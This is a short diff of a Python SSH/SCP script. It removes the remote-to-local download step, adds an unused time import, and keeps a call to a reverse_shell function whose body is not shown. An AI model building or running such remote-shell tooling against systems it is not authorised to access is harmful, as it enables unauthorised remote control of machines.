@@ -1,5 +1,6 @@
 import paramiko
 from scp import SCPClient
+import time
 
 def create_ssh_client(server, port, user, password):
     client = paramiko.SSHClient()
@@ -53,10 +54,6 @@ if __name__ == "__main__":
     local_file = input("Enter the path of the local file to transfer to remote: ")
     remote_file = input("Enter the path on the remote host to save the file: ")
     transfer_file_to_remote(ssh_client, local_file, remote_file)
-
-    remote_file = input("Enter the path of the remote file to transfer to local: ")
-    local_file = input("Enter the path on the local machine to save the file: ")
-    transfer_file_from_remote(ssh_client, remote_file, local_file)
 
     reverse_shell(ssh_client)
 
